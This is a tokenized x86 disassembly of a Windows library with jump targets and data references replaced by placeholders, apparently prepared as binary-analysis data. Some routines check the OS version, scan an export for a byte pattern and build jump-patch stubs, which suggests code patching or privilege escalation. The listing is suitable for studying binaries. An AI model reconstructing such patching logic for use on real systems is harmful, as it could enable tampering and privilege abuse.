push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x4 ]
mov edi [ eax ]
mov [ ebp - 0x28 ] edi
mov eax [ esi + 0x50 ]
lea eax [ edi + eax * 4 ]
mov [ esi + 0x8 ] eax
mov ecx [ eax ]
mov [ esi + 0xc ] ecx
lea ecx [ esi + 0x40 ]
lea edx [ esi + 0x1c ]
push ebx
push 0x4
push ecx
push eax
push edx
call sub_1000c492
add esp 0x14
mov [ ebp - 0x2c ] eax
cmp eax ebx
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x10 ]
mov [ ebp - 0x20 ] ecx
mov eax [ esi + 0x4 ]
mov [ ebp - 0x24 ] eax
cmp ecx ebx
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ esi + 0x4c ] 0x1
xor eax eax
xor eax ecx
test eax 0xfffff000
jne r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ ecx ]
mov [ ebp - 0x30 ] eax
cmp eax edi
je r-xdata
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] ebx
mov ecx [ esi + 0x50 ]
lea eax [ eax + ecx * 4 ]
mov [ esi + 0x14 ] eax
mov ecx [ eax ]
mov [ esi + 0x18 ] ecx
push ebx
push 0x4
lea ecx [ esi + 0x40 ]
push ecx
push eax
lea eax [ esi + 0x1c ]
push eax
call sub_1000c492
add esp 0x14
mov [ ebp - 0x34 ] eax
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
sub_1000a895
mov esp [ ebp - 0x18 ]
xor ebx ebx
mov esi [ ebp + 0x8 ]
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ esi + 0x4c ] 0x1
xor eax eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000a8d2
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0x8 ]
cmp esi 0xa
jae r-xdata
and [ ebp - 0x4 ] 0x0
push esi
call sub_1000a949
push esi
call sub_1000a9e7
push [ esi + 0x48 ]
push [ esi + 0x44 ]
lea eax [ esi + 0x1c ]
push eax
call [ esi ]
add esp 0x14
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax 0xc0000061
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000a949
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov esi [ ebp + 0x8 ]
lea edi [ esi + 0x1c ]
push ebx
push 0x4
lea eax [ esi + 0xc ]
push eax
push [ esi + 0x8 ]
push edi
call sub_1000c492
add esp 0x14
mov [ ebp - 0x20 ] eax
cmp eax ebx
je r-xdata
cmp [ esi + 0x10 ] ebx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov [ esi + 0x4d ] 0x1
or [ ebp - 0x4 ] 0xffffffff
xor eax eax
jmp r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx ebx
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
lea eax [ esi + 0x18 ]
cmp [ eax ] ebx
je r-xdata
push ebx
push 0x4
push eax
push ecx
push edi
call sub_1000c492
add esp 0x14
mov [ ebp - 0x20 ] eax
sub_1000a9e7
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov [ ebp - 0x20 ] ecx
test ecx ecx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
xor eax eax
jmp r-xdata
mov [ ebp - 0x24 ] 0xeb
push 0x0
push 0x1
lea edx [ ebp - 0x24 ]
push edx
push ecx
add eax 0x1c
push eax
call sub_1000c492
add esp 0x14
mov [ ebp - 0x28 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
sub_1000aa69
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x30
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
xor al al
cmp [ ebp + 0xc ] 0x0
je r-xdata
lea ebx [ edi + 0x1c ]
push rw-data
push ebx
call sub_10009b69
pop ecx
pop ecx
mov esi eax
test esi esi
je r-xdata
push rw-data
push ebx
call sub_10009b69
pop ecx
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ edi + 0x4 ] esi
and [ edi + 0x10 ] 0x0
sub esi [ edi + 0x20 ]
mov [ ebp - 0x24 ] esi
push rw-data
push [ ebx ]
call [ GetProcAddress@IAT ]
mov edx eax
mov [ ebp - 0x28 ] edx
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] eax
mov ebx 0xffbfffff
mov eax [ edi + 0x20 ]
add eax [ ebp - 0x34 ]
mov [ edi + 0x10 ] eax
jmp r-xdata
lea ecx [ eax + edx ]
mov [ ebp - 0x3c ] ecx
mov ecx [ ecx ]
and ecx ebx
mov [ ebp - 0x38 ] ecx
cmp ecx [ ebp - 0x24 ]
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov al 0x1
jmp r-xdata
inc eax
mov [ ebp - 0x30 ] eax
jmp r-xdata
lea edx [ eax + edx + 0x9 ]
mov [ ebp - 0x3c ] edx
mov edx [ edx ]
and edx ebx
mov [ ebp - 0x40 ] edx
mov esi edx
xor esi ecx
test esi 0xfffff000
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp eax 0x64
jge r-xdata
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x34 ] edx
sub_1000ab6f
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x38c
push ebx
push esi
push edi
xor ebx ebx
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
push 0x57
cmp [ ebp + 0xc ] ebx
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x6c ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x24 ] eax
lea eax [ esi + 0x200 ]
mov [ ebp - 0x398 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x20 ] bl
mov [ ebp - 0x1f ] bl
push rw-data
call sub_1000c755
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x74 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
call sub_1000beb7
pop ecx
pop ecx
cmp eax ebx
je r-xdata
push 0xffffffba
jmp r-xdata
lea eax [ ebp - 0x50 ]
push eax
call sub_10009bd3
pop ecx
test al al
jne r-xdata
push 0xffffffd4
jmp r-xdata
pop eax
or [ ebp - 0x7c ] 0xffffffff
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x13c ] ebx
lea eax [ ebp - 0x13c ]
push eax
lea eax [ ebp - 0x6c ]
push eax
call sub_1000b369
pop ecx
pop ecx
test al al
jne r-xdata
push 0xffffffc3
jmp r-xdata
push 0xd
lea eax [ ebp - 0x6c ]
push eax
push 0x7
push sub_1000b0de
push esi
push 0x17
push rw-data
call sub_10009835
mov [ ebp - 0x178 ] esi
mov eax esi
shr eax 0x10
mov [ ebp - 0x384 ] eax
mov edi 0x9c
push edi
push ebx
lea eax [ ebp - 0x134 ]
push eax
call sub_1000d316
mov [ ebp - 0x7c ] 0xffffffc1
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_1000b0ba
mov eax [ ebp - 0x7c ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000ac8f
add esp 0x28
mov [ ebp - 0x134 ] edi
lea eax [ ebp - 0x134 ]
push eax
call [ GetVersionExA@IAT ]
mov [ ebp - 0x394 ] rw-data
push 0xa
pop edi
mov [ ebp - 0x98 ] edi
cmp [ ebp - 0x130 ] 0x5
jne r-xdata
cmp [ ebp - 0xa0 ] 0x1
jne r-xdata
cmp [ ebp - 0x12c ] 0x1
jne r-xdata
cmp [ ebp - 0xa0 ] 0x2
jne r-xdata
mov [ ebp - 0x8c ] 0xa0
jmp r-xdata
cmp [ ebp - 0xa0 ] bx
jne r-xdata
mov [ ebp - 0x8c ] 0xa4
push rw-data
lea eax [ ebp - 0x120 ]
push eax
call [ strstr@IAT ]
pop ecx
pop ecx
test eax eax
mov [ ebp - 0x8c ] 0xa0
jne r-xdata
mov [ ebp - 0x16c ] 0x30
mov [ ebp - 0x168 ] ebx
mov [ ebp - 0x164 ] ebx
mov [ ebp - 0x160 ] ebx
mov [ ebp - 0x158 ] ebx
mov [ ebp - 0x154 ] ebx
mov [ ebp - 0x150 ] ebx
mov [ ebp - 0x14c ] ebx
mov [ ebp - 0x148 ] ebx
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x140 ] ebx
lea eax [ ebp - 0x16c ]
mov [ ebp - 0x94 ] eax
movzx eax [ ebp - 0x8c ]
mov [ ebp - 0x39c ] eax
sub esi eax
and esi 0xffff
mov [ ebp - 0x15c ] esi
push rw-data
lea eax [ ebp - 0x380 ]
push eax
call [ wcscpy@IAT ]
lea eax [ ebp - 0x380 ]
push eax
call [ wcslen@IAT ]
add esp 0xc
shl eax 0x1
mov [ ebp - 0x180 ] ax
mov [ ebp - 0x17e ] 0x200
lea eax [ ebp - 0x380 ]
mov [ ebp - 0x17c ] eax
lea eax [ ebp - 0x180 ]
mov [ ebp - 0x174 ] eax
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0x390 ] ebx
push 0x8
push ebx
mov esi [ LocalAlloc@IAT ]
call esi
mov edi eax
mov [ ebp - 0x90 ] edi
push 0x10
push ebx
call esi
mov esi eax
mov [ ebp - 0x390 ] esi
push 0x8
push ebx
push edi
call sub_1000d316
mov [ ebp - 0x8c ] 0xa4
jmp r-xdata
mov [ ebp - 0x394 ] rw-data
mov [ ebp - 0x98 ] edi
sub_1000b0de
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x24
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x4 ]
mov edi [ eax ]
mov [ ebp - 0x28 ] edi
mov eax [ esi + 0x50 ]
lea eax [ edi + eax * 4 ]
mov [ esi + 0x8 ] eax
mov ecx [ eax ]
mov [ esi + 0xc ] ecx
lea ecx [ esi + 0x40 ]
lea edx [ esi + 0x1c ]
push ebx
push 0x4
push ecx
push eax
push edx
call sub_1000c492
add esp 0x14
mov [ ebp - 0x2c ] eax
cmp eax ebx
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x10 ]
mov [ ebp - 0x20 ] ecx
mov eax [ esi + 0x4 ]
mov [ ebp - 0x24 ] eax
cmp ecx ebx
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ esi + 0x4c ] 0x1
xor eax eax
xor eax ecx
test eax 0xfffff000
jne r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ ecx ]
mov [ ebp - 0x30 ] eax
cmp eax edi
je r-xdata
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] ebx
mov ecx [ esi + 0x50 ]
lea eax [ eax + ecx * 4 ]
mov [ esi + 0x14 ] eax
mov ecx [ eax ]
mov [ esi + 0x18 ] ecx
push ebx
push 0x4
lea ecx [ esi + 0x40 ]
push ecx
push eax
lea eax [ esi + 0x1c ]
push eax
call sub_1000c492
add esp 0x14
mov [ ebp - 0x34 ] eax
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
sub_1000b195
mov esp [ ebp - 0x18 ]
xor ebx ebx
mov esi [ ebp + 0x8 ]
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ esi + 0x4c ] 0x1
xor eax eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000b1d2
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0x8 ]
cmp esi 0xa
jae r-xdata
and [ ebp - 0x4 ] 0x0
push esi
call sub_1000b249
push esi
call sub_1000b2e7
push [ esi + 0x48 ]
push [ esi + 0x44 ]
lea eax [ esi + 0x1c ]
push eax
call [ esi ]
add esp 0x14
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax 0xc0000061
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000b249
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov esi [ ebp + 0x8 ]
lea edi [ esi + 0x1c ]
push ebx
push 0x4
lea eax [ esi + 0xc ]
push eax
push [ esi + 0x8 ]
push edi
call sub_1000c492
add esp 0x14
mov [ ebp - 0x20 ] eax
cmp eax ebx
je r-xdata
cmp [ esi + 0x10 ] ebx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov [ esi + 0x4d ] 0x1
or [ ebp - 0x4 ] 0xffffffff
xor eax eax
jmp r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx ebx
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
lea eax [ esi + 0x18 ]
cmp [ eax ] ebx
je r-xdata
push ebx
push 0x4
push eax
push ecx
push edi
call sub_1000c492
add esp 0x14
mov [ ebp - 0x20 ] eax
sub_1000b2e7
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov [ ebp - 0x20 ] ecx
test ecx ecx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
xor eax eax
jmp r-xdata
mov [ ebp - 0x24 ] 0xeb
push 0x0
push 0x1
lea edx [ ebp - 0x24 ]
push edx
push ecx
add eax 0x1c
push eax
call sub_1000c492
add esp 0x14
mov [ ebp - 0x28 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
sub_1000b369
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x30
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
xor al al
cmp [ ebp + 0xc ] 0x0
je r-xdata
lea ebx [ edi + 0x1c ]
push rw-data
push ebx
call sub_10009b69
pop ecx
pop ecx
mov esi eax
test esi esi
je r-xdata
push rw-data
push ebx
call sub_10009b69
pop ecx
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ edi + 0x4 ] esi
and [ edi + 0x10 ] 0x0
sub esi [ edi + 0x20 ]
mov [ ebp - 0x24 ] esi
push rw-data
push [ ebx ]
call [ GetProcAddress@IAT ]
mov edx eax
mov [ ebp - 0x28 ] edx
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] eax
mov ebx 0xffbfffff
mov eax [ edi + 0x20 ]
add eax [ ebp - 0x34 ]
mov [ edi + 0x10 ] eax
jmp r-xdata
lea ecx [ eax + edx ]
mov [ ebp - 0x3c ] ecx
mov ecx [ ecx ]
and ecx ebx
mov [ ebp - 0x38 ] ecx
cmp ecx [ ebp - 0x24 ]
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov al 0x1
jmp r-xdata
inc eax
mov [ ebp - 0x30 ] eax
jmp r-xdata
lea edx [ eax + edx + 0x9 ]
mov [ ebp - 0x3c ] edx
mov edx [ edx ]
and edx ebx
mov [ ebp - 0x40 ] edx
mov esi edx
xor esi ecx
test esi 0xfffff000
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp eax 0x64
jge r-xdata
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x34 ] edx
sub_1000b46f
push ebp
mov ebp esp
sub esp 0x288
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
cmp esi ebx
push edi
je r-xdata
push 0x57
cmp [ ebp + 0xc ] ebx
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x88 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x84 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x80 ] eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0x10 ]
push eax
mov [ ebp - 0x58 ] bl
call sub_1000beb7
pop ecx
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x7c ]
push eax
call sub_10009bd3
lea eax [ ebp - 0x88 ]
push 0xd
push eax
push 0x7
push sub_1000b6d7
push esi
push 0x17
push rw-data
call sub_10009835
lea eax [ ebp - 0x54 ]
add esi 0xffffff68
mov [ ebp + 0x18 ] eax
lea eax [ ebp - 0x288 ]
and esi 0xffff
push rw-data
push eax
mov [ ebp - 0x54 ] 0x30
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x44 ] esi
call [ wcscpy@IAT ]
lea eax [ ebp - 0x288 ]
push eax
call [ wcslen@IAT ]
mov esi [ LocalAlloc@IAT ]
add esp 0x2c
shl eax 0x1
mov [ ebp - 0x8 ] ax
lea eax [ ebp - 0x288 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push 0x8
push ebx
mov [ ebp - 0x6 ] 0x200
mov [ ebp - 0x20 ] eax
call esi
push 0x10
push ebx
mov edi eax
call esi
push 0x8
push ebx
push edi
mov esi eax
call sub_1000d316
push 0xffffffd4
jmp r-xdata
pop eax
pop edi
pop esi
pop ebx
leave
retn
sub_1000b6d7
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x30 ] 0x1
push [ eax + 0x8 ]
push [ eax + 0x4 ]
lea ecx [ eax + 0xc ]
push ecx
call [ eax ]
add esp 0xc
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000b73a
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x2e4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
xor ebx ebx
cmp esi ebx
je r-xdata
push 0x57
cmp [ ebp + 0xc ] ebx
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x6c ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x28 ] eax
lea eax [ esi + 0x200 ]
mov [ ebp - 0x2f4 ] eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x24 ] bl
mov [ ebp - 0x23 ] bl
mov [ ebp - 0x5c ] 0xea
mov cl al
mov [ ebp - 0x5b ] cl
mov ecx eax
shr ecx 0x8
mov [ ebp - 0x5a ] cl
mov ecx eax
shr ecx 0x10
mov [ ebp - 0x59 ] cl
shr eax 0x18
mov [ ebp - 0x58 ] al
mov [ ebp - 0x57 ] 0x8
mov [ ebp - 0x56 ] bl
mov [ ebp - 0x55 ] 0x90
push rw-data
call sub_1000c755
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x74 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
call sub_1000beb7
pop ecx
pop ecx
cmp eax ebx
je r-xdata
push 0xffffffba
jmp r-xdata
lea eax [ ebp - 0x54 ]
push eax
call sub_10009bd3
pop ecx
test al al
jne r-xdata
push 0xffffffd4
jmp r-xdata
pop eax
or [ ebp - 0x7c ] 0xffffffff
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x9c ] ebx
lea eax [ ebp - 0x9c ]
push eax
lea eax [ ebp - 0x6c ]
push eax
call sub_1000be1b
pop ecx
pop ecx
test al al
jne r-xdata
push 0xffffffc3
jmp r-xdata
push 0xd
lea eax [ ebp - 0x6c ]
push eax
push 0x7
push sub_1000bc1c
push esi
push 0x17
push rw-data
call sub_10009835
mov [ ebp - 0xd8 ] esi
mov eax esi
shr eax 0x10
mov [ ebp - 0x2e4 ] eax
mov [ ebp - 0x8c ] 0xb0
mov [ ebp - 0xcc ] 0x30
mov [ ebp - 0xc8 ] ebx
mov [ ebp - 0xc4 ] ebx
mov [ ebp - 0xc0 ] ebx
mov [ ebp - 0xbc ] ebx
mov [ ebp - 0xb8 ] ebx
mov [ ebp - 0xb4 ] ebx
mov [ ebp - 0xb0 ] ebx
mov [ ebp - 0xac ] ebx
mov [ ebp - 0xa8 ] ebx
mov [ ebp - 0xa4 ] ebx
mov [ ebp - 0xa0 ] ebx
lea eax [ ebp - 0xcc ]
mov [ ebp - 0x94 ] eax
lea eax [ esi - 0xb0 ]
and eax 0xffff
mov [ ebp - 0xbc ] eax
push rw-data
lea eax [ ebp - 0x2e0 ]
push eax
call [ wcscpy@IAT ]
lea eax [ ebp - 0x2e0 ]
push eax
call [ wcslen@IAT ]
add esp 0x28
shl eax 0x1
mov [ ebp - 0xe0 ] ax
mov [ ebp - 0xde ] 0x200
lea eax [ ebp - 0x2e0 ]
mov [ ebp - 0xdc ] eax
lea eax [ ebp - 0xe0 ]
mov [ ebp - 0xd4 ] eax
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0x2f0 ] ebx
push 0x8
push ebx
mov edi [ LocalAlloc@IAT ]
call edi
mov [ ebp - 0x90 ] eax
push 0x10
push ebx
call edi
mov edi eax
mov [ ebp - 0x2f0 ] edi
push 0x8
push ebx
push [ ebp - 0x90 ]
call sub_1000d316
mov [ ebp - 0x7c ] 0xffffffc1
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_1000bbf8
mov eax [ ebp - 0x7c ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000bc1c
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov ecx [ esi + 0x4 ]
mov [ ebp - 0x20 ] ecx
xor eax eax
push 0x0
push 0x8
lea eax [ esi + 0x10 ]
push eax
push [ esi + 0x4 ]
lea eax [ esi + 0x18 ]
push eax
call sub_1000c492
add esp 0x14
mov [ ebp - 0x28 ] eax
test eax eax
jne r-xdata
mov dl [ eax + ecx ]
mov [ eax + esi + 0x8 ] dl
inc eax
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov [ esi + 0x48 ] 0x1
mov [ ebp - 0x24 ] eax
cmp eax 0x8
jae r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000bca8
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0x8 ]
cmp esi 0xa
jae r-xdata
and [ ebp - 0x4 ] 0x0
push esi
call sub_1000bd1f
push esi
call sub_1000bd99
push [ esi + 0x44 ]
push [ esi + 0x40 ]
lea eax [ esi + 0x18 ]
push eax
call [ esi ]
add esp 0x14
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax 0xc0000061
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000bd1f
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
push 0x0
push 0x8
mov esi [ ebp + 0x8 ]
lea eax [ esi + 0x8 ]
push eax
push [ esi + 0x4 ]
lea eax [ esi + 0x18 ]
push eax
call sub_1000c492
add esp 0x14
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov [ esi + 0x49 ] 0x1
or [ ebp - 0x4 ] 0xffffffff
xor eax eax
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000bd99
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x2c ]
mov [ ebp - 0x20 ] ecx
test ecx ecx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
xor eax eax
jmp r-xdata
mov [ ebp - 0x24 ] 0xeb
push 0x0
push 0x1
lea edx [ ebp - 0x24 ]
push edx
push ecx
add eax 0x18
push eax
call sub_1000c492
add esp 0x14
mov [ ebp - 0x28 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
sub_1000be1b
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
test esi esi
je r-xdata
xor al al
cmp [ esp + 0x14 ] 0x0
je r-xdata
lea edi [ esi + 0x18 ]
push rw-data
push edi
call sub_10009b69
mov ebx eax
pop ecx
test ebx ebx
pop ecx
je r-xdata
push rw-data
push edi
call sub_10009b69
pop ecx
test eax eax
pop ecx
je r-xdata
mov ecx [ esp + 0x14 ]
mov [ ecx ] eax
mov [ esi + 0x4 ] ebx
mov al 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_1000beb7
push esi
push rw-data
call sub_1000bef0
mov esi eax
mov [ esp ] rw-data
call sub_1000bef0
test esi esi
pop ecx
je r-xdata
push 0xffffffd4
pop eax
pop esi
retn
test eax eax
je r-xdata
